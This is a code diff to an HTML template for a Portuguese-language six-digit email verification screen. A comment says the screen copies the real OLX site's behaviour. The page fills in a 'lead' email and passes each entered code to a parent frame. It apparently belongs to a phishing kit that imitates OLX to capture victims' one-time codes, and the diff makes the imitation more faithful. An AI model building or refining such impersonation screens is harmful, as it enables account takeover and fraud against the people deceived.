@@ -270,6 +270,8 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
   .code-wrap{display:flex;gap:8px;justify-content:space-between;margin:0 0 12px}
   .code-wrap input{flex:1;min-width:0;height:52px;text-align:center;font-size:20px;font-weight:600;border:1px solid #d0d0d0;border-radius:8px;color:#1a1a1a;background:#fff;outline:none;transition:border-color .15s;padding:0;font-family:inherit}
   .code-wrap input:focus{border-color:#6E0AD6}
+  .code-wrap.has-error input{border-color:#E11900;color:#E11900}
+  .code-error-top{display:none;color:#E11900;font-size:13px;font-weight:400;margin:0 0 8px}
   .resend-row{display:flex;justify-content:flex-start;margin:0 0 20px}
   .resend-link{background:none;border:0;color:#6E0AD6;font:inherit;font-size:14px;font-weight:600;cursor:pointer;padding:0;text-decoration:none}
   .resend-link:hover{text-decoration:underline}
@@ -305,6 +307,8 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
       <span class="email" id="user-email">{{lead.email}}</span>
     </p>
 
+    <p class="code-error-top" id="code-error-top">Código inválido</p>
+
     <div class="code-wrap" id="code-wrap">
       <input id="input-pincode-0" type="tel" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Código de verificação da 1ª posição de 6 posições">
       <input id="input-pincode-1" type="tel" inputmode="numeric" maxlength="1" aria-label="Código de verificação da 2ª posição de 6 posições">
@@ -318,7 +322,6 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
       <button type="button" class="resend-link" id="resend-btn">Reenviar código</button>
     </div>
 
-    <p class="code-error" id="code-error">Código inválido. Verifique e tente novamente.</p>
 
     <div class="loading-row" id="loading-row">
       <div class="spinner"></div>
@@ -347,8 +350,9 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
   <script>
     (function(){
       var inputs = Array.prototype.slice.call(document.querySelectorAll('#code-wrap input'));
+      var codeWrap = document.getElementById('code-wrap');
       var loadingRow = document.getElementById('loading-row');
-      var errorEl = document.getElementById('code-error');
+      var errorEl = document.getElementById('code-error-top');
       var submitted = false;
 
       function setLoading(on){
@@ -356,15 +360,21 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
         inputs.forEach(function(i){ i.disabled = on; });
       }
 
+      function clearError(){
+        if(errorEl) errorEl.style.display = 'none';
+        if(codeWrap) codeWrap.classList.remove('has-error');
+      }
+
       function showError(msg){
         if(errorEl){
-          errorEl.textContent = msg || 'Código inválido. Verifique e tente novamente.';
+          errorEl.textContent = msg || 'Código inválido';
           errorEl.style.display = 'block';
         }
-        inputs.forEach(function(i){ i.style.borderColor = '#e53e3e'; i.value = ''; i.disabled = false; });
+        if(codeWrap) codeWrap.classList.add('has-error');
+        // Mantém os valores digitados (igual ao comportamento real da OLX)
+        inputs.forEach(function(i){ i.disabled = false; i.setAttribute('aria-invalid','true'); });
         if(loadingRow) loadingRow.style.display = 'none';
         submitted = false;
-        if(inputs[0]) inputs[0].focus();
       }
 
       function emitIfFull(){
@@ -372,7 +382,7 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
         var code = inputs.map(function(i){ return i.value || ''; }).join('');
         if(code.length === inputs.length){
           submitted = true;
-          if(errorEl) errorEl.style.display = 'none';
+          clearError();
           setLoading(true);
           window.parent.postMessage({
             type: 'iframe-help-action',
@@ -394,8 +404,8 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
       inputs.forEach(function(inp, idx){
         inp.addEventListener('input', function(){
           inp.value = (inp.value || '').replace(/\\D/g, '').slice(0, 1);
-          inp.style.borderColor = '';
-          if(errorEl) errorEl.style.display = 'none';
+          inp.removeAttribute('aria-invalid');
+          clearError();
           if(inp.value && idx < inputs.length - 1){
             inputs[idx + 1].focus();
           }
